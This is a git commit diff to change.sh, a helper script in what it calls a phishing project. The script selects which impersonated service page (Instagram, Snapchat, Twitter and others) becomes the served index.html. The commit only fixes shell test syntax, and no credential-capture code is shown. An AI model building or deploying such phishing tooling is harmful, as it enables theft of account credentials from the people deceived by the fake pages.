26c5c816d88dd41eb022918e1f4af17e0415088d
Harsh Singhvi <harshsinghvi98@gmail.com>
2020-06-28 15:38:21 +0530

    update change.sh script dine testing

--- src/change.sh
+++ src/change.sh
@@ -1,16 +1,5 @@
 # usage bash chaneg.sh <servicename>[instagram, snapchat , default etc]
 git pull
-if [-f $1.html]
-    then 
-        cp $1.html index.html
-        echo "dont changing main site to $1" 
-fi
-
-if [! -f $1.html]
-    then 
-        cp default.html index.html
-        echo "ERROR 404 $1 not found "
-fi
 
 echo 
 echo 
@@ -29,3 +18,16 @@ echo twitter
 echo instafollowers
 echo snapchat 
 echo "more comming soon stay updated at https://hub.docker.com/repository/docker/insomniaccoder/phishing"
+echo "--------------------------------"
+echo 
+if [ -f $1.html ]
+    then 
+        cp $1.html index.html
+        echo "Done changing main site to $1" 
+fi
+
+if [ ! -f $1.html ]
+    then 
+        cp default.html index.html
+        echo "ERROR 404 $1 not found changing to default "
+fi
